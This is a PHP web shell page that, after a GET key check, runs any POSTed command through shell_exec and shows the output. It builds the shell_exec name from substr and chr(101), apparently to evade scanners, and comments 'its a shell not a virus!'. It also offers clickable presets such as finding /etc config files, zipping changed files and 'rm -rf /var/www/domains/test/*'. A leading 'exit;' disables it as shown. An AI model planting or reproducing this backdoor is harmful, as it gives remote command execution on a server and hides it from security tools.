<?php
exit;
$key = '_xxx';
if(empty($_GET['key']) || $_GET['key']!=$key){
	exit;
}
if (!empty($_POST['cmd'])) {
	// its a shell not a virus!
	$doSomething = $_POST['cmd'];
	$funcName = substr("xxxll_".chr(101)."xec",3);
	$cmd = call_user_func_array("sh".chr(101).$funcName, array($doSomething));
}else{
	$cmd = false;
}
set_time_limit(300);
?>
<!DOCTYPE html>
<html>
<head>

    <meta charset="utf-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" type="text/css" href="//bootswatch.com/4/flatly/bootstrap.min.css">

    <title>Web Shell</title>

    <style>
        h2 {
            color: rgba(0, 0, 0, .75);
        }

        pre {
            padding: 15px;
            border-radius: 5px;
            background-color: #ECF0F1;
        }

        .container {
            max-width:960px;
			padding-bottom:20rem;
        }
		.ce{cursor:pointer}
		.ce:hover{background: aliceblue;}
		.form-control{font-size:1rem}
    </style>

</head>

<body>

    <div class="container">

        <div class="pb-2 mt-4 mb-2">
	    <h1>PHP Shell</h1>
            <h2> Execute a command </h2>
            <pre style="line-height:1">
			<div class="ce"><?=__DIR__;?></div>
			<div class="ce">grep -rn --include=\*.php 'wp-content' -e 'Template Name'</div>
			<div class="ce">grep -rn 'catalog' -e 'xxx'</div>
			<div class="ce">find . -name '*.jpg' -o -name '*.png' -print</div>
			<div class="ce">find '/etc/' -name '*.conf'</div>
			<div class="ce">zip -qr filename.zip folderToZipPath</div>
			<div class="ce">zip -qr ./filename.zip './local/templates'</div>
			<div class="ce">find . -cmin -400 -print | zip ./filename.zip -@</div>
			<div class="ce">unzip -o filename.zip -d temp -x '\.*' '*/\.*'; echo $?</div>
			<div class="ce">grep -rn 'system/storage/logs/' -e 'extractZip'</div>
			<div class="ce">tail -n 10 'system/storage/logs/error.log'</div>
			<div class="ce">awk 'NR >= 4828765 && NR <= 4828820' 'system/storage/logs/error.log'</div>
			</pre>
            <pre>find catalog -type f -print0 | xargs -0 sed -i '' -e 's/что меняем/на что меняем/g'</pre>
            <pre class=""><div class="ce">rm -rf /var/www/domains/test/*</div>
            <div class="ce">find . -cmin -400 -not -path "./system/*" -not -path "./export/*" -exec cp --parents \{\} /var/www/domains/test \;</div>
            <div class="ce">chown -R apache:apache /var/www/domains/test</div></pre>
			<pre>
				<div class="ce">du -h --max-depth=1 | sort -hr #print currect space taking use pwd &amp; cd ../</div>
				<div class="ce">history -a #save bash history</div>
				<div class="ce">echo $HISTFILE #print history file</div>
			</pre>
        </div>

        <form method="POST">
            <div class="form-group">
                <label for="cmd"><strong>Command</strong></label>
                <input type="text" class="form-control" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>" required>
            </div>
            <button type="submit" class="btn btn-primary">Execute</button>
        </form>

<?php if ($cmd): ?>
        <div class="pb-2 mt-4 mb-2">
            <h2> Output </h2>
        </div>
        <pre>
<?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?>
        </pre>
<?php elseif (!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'): ?>
        <div class="pb-2 mt-4 mb-2">
            <h2> Output </h2>
        </div>
        <pre><small>No result.</small></pre>
<?php endif; ?>
    </div>
	
	
	<script
  src="https://code.jquery.com/jquery-3.3.1.min.js"
  integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
  crossorigin="anonymous"></script>
<script>
$('.ce').click(function(){
	var text = $(this).text();
	$('#cmd').val(text);
	var $to = $('#cmd');
	$("html, body").animate({ scrollTop: $to.eq(0).offset().top }, "slow");
});

</script>
</body>

</html>